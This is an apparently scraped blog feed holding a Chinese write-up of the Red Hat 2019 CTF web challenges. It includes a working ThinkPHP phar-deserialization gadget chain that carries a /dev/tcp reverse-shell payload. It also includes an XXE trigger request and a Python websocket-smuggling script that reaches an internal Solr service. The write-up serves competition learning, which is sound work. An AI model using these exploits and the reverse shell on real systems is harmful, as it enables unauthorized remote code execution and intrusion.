LUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113235515.jpeg" alt=""></p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;我们 SU 这次一共做出了3个 Web ，由于今年 XCTF Final 的时间不是特别好，我们队其他师傅有考试的考试，基本就现场的两个 Web 手在做，最后 LFI2019 比较可惜，如果多个几 min 我们就可以出了，实在可惜。下面就写写本次的 Web Write Up。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Red Hat 2019 Web Write Up</title>
    <link href="https://blog.zeddyu.info/2019/11/13/Red-Hat-2019/"/>
    <id>https://blog.zeddyu.info/2019/11/13/Red-Hat-2019/</id>
    <published>2019-11-13T15:18:06.000Z</published>
    <updated>2021-09-27T17:45:58.720Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>红帽杯 2019 Web Write Up (除 iCloudMusic</p><a id="more"></a><p>[TOC]</p><h2 id="Ticket-System"><a href="#Ticket-System" class="headerlink" title="Ticket_System"></a>Ticket_System</h2><p>XXE 2 Phar 反序列化加 Nu1lCTF sql_manager 的 thinkphp pop 链就行了</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span> {</span><br><span class="line">    <span class="hljs-title">class</span> <span class="hljs-title">Windows</span></span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-title">private</span> $<span class="hljs-title">files</span>;</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($files)</span></span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;files = <span class="hljs-keyword">array</span>($files);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span> {</span><br><span class="line">    <span class="hljs-title">trait</span> <span class="hljs-title">Conversion</span></span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-title">protected</span> $<span class="hljs-title">append</span> = <span class="hljs-title">array</span>("<span class="hljs-title">Zedd</span>" =&gt; "1");</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">trait</span> Attribute</span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-keyword">private</span> $data;</span><br><span class="line">        <span class="hljs-keyword">private</span> $withAttr = <span class="hljs-keyword">array</span>(<span class="hljs-string">"Zedd"</span> =&gt; <span class="hljs-string">"system"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($system)</span></span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;data = <span class="hljs-keyword">array</span>(<span class="hljs-string">"Zedd"</span> =&gt; <span class="hljs-string">"$system"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span> {</span><br><span class="line">    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Model</span></span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-title">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Attribute</span>;</span><br><span class="line">        <span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Conversion</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>{</span><br><span class="line">    <span class="hljs-title">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;</span><br><span class="line">    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span></span><br><span class="line"><span class="hljs-class">    </span>{</span><br><span class="line">        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($system)</span></span></span><br><span class="line"><span class="hljs-function">        </span>{</span><br><span class="line">            <span class="hljs-keyword">$this</span>-&gt;get($system);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">namespace</span> {</span><br><span class="line">    $Conver = new think\model\Pivot("bash -c 'sh &gt;&amp; /dev/tcp/you r_ip/port 0&gt;&amp;1'");</span><br><span class="line">    $payload = <span class="hljs-keyword">new</span> think\process\pipes\Windows($Conver);</span><br><span class="line">    ini_set(<span class="hljs-string">'phar.readonly'</span>,<span class="hljs-number">0</span>);</span><br><span class="line">    @unlink(<span class="hljs-string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">"phar.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="hljs-string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span></span><br><span class="line">    $phar-&gt;setMetadata($payload); <span class="hljs-comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="hljs-comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">    rename(<span class="hljs-string">'phar.phar'</span>,<span class="hljs-string">'phar.xml'</span>);</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>传这个 xml 上去之后再发以下请求：</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/postxml</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:8000</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: PHPSESSID=e4gevanqetq7dvri2q8ujh68hr</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/xml;charset=utf-8</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 229</span><br><span class="line"></span><br><span class="line">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'phar:///tmp/uploads/28b20c7474c6127c57486e26ad1442b9/20191110/e08b7a076a3d519f8936d3d8b8c17a27.xml'&gt;]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>用 XXE 触发 phar 反序列化即可。</p><p>我看有些师傅还在为<code>/readflag</code>头疼…这也不是啥新玩意了，可以直接用<code>trap "" 14</code>就可以让验证码停下来了。</p><h2 id="bank-service"><a href="#bank-service" class="headerlink" title="bank_service"></a>bank_service</h2><p><strong>Second Blood</strong></p><p>做的还是比较有意思的一题，可惜当时做的比较zz，本来可以一血，就是因为自己弄的太不小心了。</p><p>因为之前一直在研究 HTTP Smuggling 的东西，我在腾讯的导师也对这个挺感兴趣的，前阵子给我发了一个 Websocket  Smuggling</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113011351.png" alt=""></p><p>看完后一脸懵逼，文章跟之前 Black Hat 2019 HTTP Desync 那个议题一样，只说了有这么个攻击面，但是没有说怎么产生的，但是还好给了 POC 以及一些 challs ，虽然我当时复现了一下，但是依然懵逼。</p><p>直到作者终于在前几天把 <a href="https://github.com/0ang3el/websocket-smuggle" target="_blank" rel="noopener">websocket-smuggle</a> 攻击原理用文章描述了出来，恰巧这次比赛也出到了这么个题目，所以看到题目用了 websocket ，我就猜可能是这个攻击面了。</p><p>这个攻击面是什么呢？帮大家一句话总结就是在 websocket 建立连接时，如果反向代理没有完全严格遵守 RFC 6445 标准，在处理<code>Sec-WebSocket-Version</code> 版本错误的情况并没有做好相应的处理，导致了保持了客户端与后端服务器 TCP/TLS 的连接，所以造成了我们可以进行 Smuggling 请求的攻击，这里直接表现为可以通过这种攻击访问内网。</p><p>我们再回到题目，题目的 zz 客服只会重复一句话</p><blockquote><p>​    我们基于solr提供优质的银行信息搜索服务。</p></blockquote><p>那应该就是提示 solr 了，前阵子有个 <a href="https://paper.seebug.org/1009/" target="_blank" rel="noopener">solr RCE</a> …但是我们直接访问 solr 服务是 403 …</p><p>于是我们尝试直接用 Smuggling 探测 solr 服务</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> socket </span><br><span class="line"></span><br><span class="line">req1 = <span class="hljs-string">"""GET /socket.io/?EIO=3&amp;transport=websocket HTTP/1.1</span></span><br><span class="line"><span class="hljs-string">Host: 47.105.57.19:3000</span></span><br><span class="line"><span class="hljs-string">Sec-WebSocket-Version: 1338</span></span><br><span class="line"><span class="hljs-string">Upgrade: websocket</span></span><br><span class="line"><span class="hljs-string">Cookie: user=admin; io=wdvnH-5hbXMU4XPFAC_O</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">"""</span>.replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">req2 = <span class="hljs-string">"""GET /solr HTTP/1.1</span></span><br><span class="line"><span class="hljs-string">Host: localhost:8983</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">"""</span>.replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">(netloc)</span>:</span></span><br><span class="line">    host, port = netloc.split(<span class="hljs-string">':'</span>)</span><br><span class="line"></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, int(port)))</span><br><span class="line"></span><br><span class="line">    sock.sendall(req1)</span><br><span class="line">    sock.recv(<span class="hljs-number">4096</span>)</span><br><span class="line"></span><br><span class="line">    sock.sendall(req2)</span><br><span class="line">    <span class="hljs-comment"># print req2</span></span><br><span class="line">    data = sock.recv(<span class="hljs-number">4096</span>)</span><br><span class="line">    data = data.decode(errors = <span class="hljs-string">'ignore'</span>)</span><br><span class="line">    print(data)</span><br><span class="line">    data = sock.recv(<span class="hljs-number">4096</span>)</span><br><span class="line">    data = data.decode(errors = <span class="hljs-string">'ignore'</span>)</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line">    sock.shutdown(socket.SHUT_RDWR)</span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:</span><br><span class="line">    main(<span class="hljs-string">'47.105.57.19:3000'</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>发现是个302跳转…</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191112113326.png" alt=""></p><p>看来还是得起本地环境来试试看，刚好 <a href="https://github.com/vulhub/vulhub/tree/master/solr/CVE-2019-0193" target="_blank" rel="noopener">vulhub</a> 有一个环境（p牛辣是真的牛批</p><p>直接起起来，然后发现 solr 的入口是 <code>/solr/#/</code> ，然后我们把 req2 的请求部分改成 <code>/solr/#/</code>就可以看到页面内容了</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">req2 = <span class="hljs-string">"""GET /solr/#/ HTTP/1.1</span></span><br><span class="line"><span class="hljs-string">Host: localhost:8983</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">"""</span>.replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">'\r\n'</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>可惜这个 Smuggling 技术貌似没有直接能像代理一样的功能，不能用浏览器直接浏览内容，每次只能自己去分析回显，不过这个题也不需要用到渲染交互什么的，直接都是可以发送 api 请求的。</p><p>于是我们本地起环境，用 Github 上几个 exp 试了一下，发现有外连的我本地可以成功，但是打远程不行…</p><p>然后我仔细看了 <a href="https://github.com/1135/solr_exploit" target="_blank" rel="noopener">solr_exploit</a> poc 以及 <a href="https://paper.seebug.org/1009/#poc-_2" target="_blank" rel="noopener">PoC第三阶段–无外连+有回显</a>，想必应该就是这个了吧，后来给出的 hint 也验证了这一点，就是需要构造那篇文章当中打了码的 POC (又是一个看图猜 POC 的题，我要吐了</p><h3 id="侧信道攻击"><a href="#侧信道攻击" class="headerlink" title="侧信道攻击"></a>侧信道攻击</h3><p><del>于是我拿着这个图找了一些 PS 大神进行处理，结果淘宝卖家说我是第四个找他们处理的人了.jpg</del></p><p>于是开始了漫漫 POC 猜测之路，首先我们看图可以发现图中有两个蓝色的快，那么第一行有没有可能是:</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>让我们试试看，把 burp 与文章 burp 拉到同样高度，然后 xml 标签之后随便弄几个 payload</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCC